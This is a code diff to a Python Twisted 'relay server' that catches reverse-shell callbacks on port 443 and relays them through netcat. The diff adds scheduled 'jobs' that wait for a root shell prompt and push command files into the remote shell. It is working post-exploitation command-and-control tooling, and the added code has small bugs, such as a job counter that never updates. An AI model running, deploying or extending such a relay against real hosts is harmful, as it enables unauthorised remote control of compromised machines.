@@ -3,19 +3,22 @@
 from twisted.internet.protocol import Factory
 from twisted.protocols.basic import LineReceiver
 from twisted.internet import reactor, protocol
-import pdb, datetime, re
+import pdb, datetime, re, os
 
 LISTEN_PORT = 443 # Your callbacks should be sent here
 COMMAND_PORT = 444 # Port to interact with server
 NETCAT = '/bin/nc' 
+PROMPT = r'# $' #default shell prompt
 
 class Listener(LineReceiver):
 	
-	def __init__(self, hosts, sched, conn):
+	def __init__(self, hosts, sched, conn, jobs):
 		self.hosts = hosts
 		self.sched = sched
 		self.conn = conn
+		self.jobs = jobs
 		self.nc = None
+		self.job = None
 
 	def connectionMade(self):
 		host = self.transport.getPeer().host
@@ -36,17 +39,36 @@ class Listener(LineReceiver):
 					self.conn.append([host, target, port])
 					self.nc = ProcessProtocol(self)	
 					reactor.spawnProcess(self.nc, cmd[0], cmd, {}, cwd)
-			if self.nc == None:
-				self.transport.loseConnection()
-		# else if self.jobs <- IMPLEMENT
+
+		elif self.jobs:
+			for shost, job, p, c in self.jobs:
+				if shost == host:
+					self.job = 1
+
+		elif not self.job and not self.nc:
+			self.transport.loseConnection()
+
 		else:		
-			#Kill it if nothing is scheduled
 			self.transport.loseConnection()
 
 	def dataReceived(self, data):
 		if self.nc != None:
 			self.nc.transport.write(data)
 
+		if self.jobs:
+			for job in self.jobs:
+				shost, filename, prompt, count = job
+				if shost == self.transport.getPeer().host:
+					if re.search(prompt, data):
+						with open(os.getcwd() + "/jobs/" + filename) as jobfile:
+							for line in jobfile.readlines():
+								self.sendLine(line)
+						self.transport.loseConnection()
+						if count == 1:
+							self.jobs.remove(job)
+						if count > 1:
+							count -= 1
+								
 	def connectionLost(self, reason):
 		if self.nc != None:
 			self.nc.transport.loseConnection()
@@ -73,9 +95,10 @@ class ListenerFactory(Factory):
 		self.hosts = []
 		self.sched = []
 		self.conn = []
+		self.jobs = []
 		
 	def buildProtocol(self, addr):
-		return Listener(self.hosts, self.sched, self.conn)
+		return Listener(self.hosts, self.sched, self.conn, self.jobs)
 
 class Control(LineReceiver):
 	delimiter = "\n"
@@ -84,17 +107,17 @@ class Control(LineReceiver):
 		self.hosts = listener.hosts
 		self.state = "MENU"
 		self.name = "--- Super Cool Relay Server v0.1 ---\n\n"
-		self.help = "Commands:\nshow - Show last connections\nlist - List scheduled relays\nadd - Add relay (ex. add <host> <target> <port>)\ndel - Delete relay(s) (ex. del <target> or del all)\nclean - Clear out last connections cache\n"
+		self.help = "show - Show last connections\nlist - List scheduled relays, active relays, and jobs\nadd - Add relay (ex. add <host> <target> <port>)\n      Add job (ex. add <host> <job> (<times to run> default forever))\ndel - Delete relay(s) (ex. del <target> or del all)\n      Delete job (ex. del <target> <job>)\nclean - Clear out last connections cache"
 
 	def connectionMade(self):
-		self.sendLine(self.name + self.help)
+		self.sendLine(self.name + "(type help for commands)")
 
 	def lineReceived(self, line):
 		if self.state == "MENU":
 			self.handle_menu(line)
 
 	def handle_menu(self, cmd):
-		if re.match(r'quit', cmd):
+		if re.match(r'quit|exit', cmd):
 			self.transport.loseConnection()
 
 		if re.match(r'clean', cmd):
@@ -109,27 +132,54 @@ class Control(LineReceiver):
 				self.sendLine("No connections")
 
 		if re.match(r'add ', cmd):
-			c, host, target, port = re.split(r' ', cmd)
-			if re.match(r'([0-9]{1,3}\.){3}[0-9]{1,3}', host) and re.match(r'([0-9]{1,3}\.){3}[0-9]{1,3}', target) and re.match(r'[0-9]{1,5}', port):
-				listener.sched.append([host, target, port])	
+			ipregex = r'([0-9]{1,3}\.){3}[0-9]{1,3}'
+			if len(cmd.split()) == 4:
+				c, host, target, port = cmd.split()
+				if re.match(ipregex, host) and re.match(ipregex, target) and re.match(r'[0-9]{1,5}', port):
+					listener.sched.append([host, target, port])	
+				elif re.match(ipregex,host) and re.match(r'[a-zA-Z0-9]+', target):
+					if re.match(r'[0-9]{1,}', port):
+						listener.jobs.append([host, target, PROMPT, int(port)]) #host, job, prompt, count
+					else:
+						listener.jobs.append([host, target, port, None]) #host, job, prompt
+
+			if len(cmd.split()) == 3:
+				c, host, job = cmd.split()
+				if re.match(ipregex, host) and re.match(r'[a-zA-Z0-9]+', job):
+					listener.jobs.append([host, job, PROMPT, None])
 
 		if re.match(r'del ', cmd):
-			c, host = re.split(r' ', cmd)
-			if host == "all":
-				listener.sched = []	
-			else:
-				for record in listener.sched:
-					if host in record:
-						listener.sched.remove(record)
+			if len(cmd.split()) == 3:
+				c, host, job = cmd.split()
+				for record in listener.jobs:
+					if host and job in record:
+						listener.jobs.remove(record)
+			if len(cmd.split()) == 2:
+				c, host = cmd.split()
+				if re.match(r'all', host):
+					listener.sched = []	
+				else:
+					for record in listener.sched:
+						if host in record:
+							listener.sched.remove(record)
 			
 		if re.match(r'list', cmd):
 			if listener.sched:
+				self.sendLine("--- Relays ---")
 				for host, target, port in listener.sched:
 					self.sendLine(host + " will be relayed to " + target + " on port " + port)
 			if listener.conn:
 				self.sendLine("\n--- Connections ---")
 				for host, target, port in listener.conn:
 					self.sendLine(host + " --> " + target + ":" + port)
+			
+			if listener.jobs:
+				self.sendLine("\n--- Jobs ---")
+				for host, job, p, count in listener.jobs:
+					if count == None:
+						self.sendLine(host + " --> " + job)
+					else:
+						self.sendLine(host + " --> " + job + " '" + count + "' more times")
 
 		if re.match(r'help', cmd):
 			self.sendLine(self.help)	
